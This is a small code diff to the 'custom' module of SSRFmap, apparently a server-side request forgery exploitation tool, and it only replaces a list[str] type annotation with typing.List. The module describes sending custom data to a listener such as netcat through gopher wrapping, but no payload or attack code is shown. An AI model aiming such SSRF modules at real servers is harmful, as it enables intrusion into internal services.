@@ -1,12 +1,13 @@
 import logging
 import urllib.parse
+from typing import List
 
 from ssrfmap.core.utils import gen_ip_list, wrapper_gopher
 
 name = "custom"
 description = "Send custom data to a listening service, e.g: netcat"
 author = "Swissky"
-documentation: list[str] = []
+documentation: List[str] = []
 
 
 class exploit:
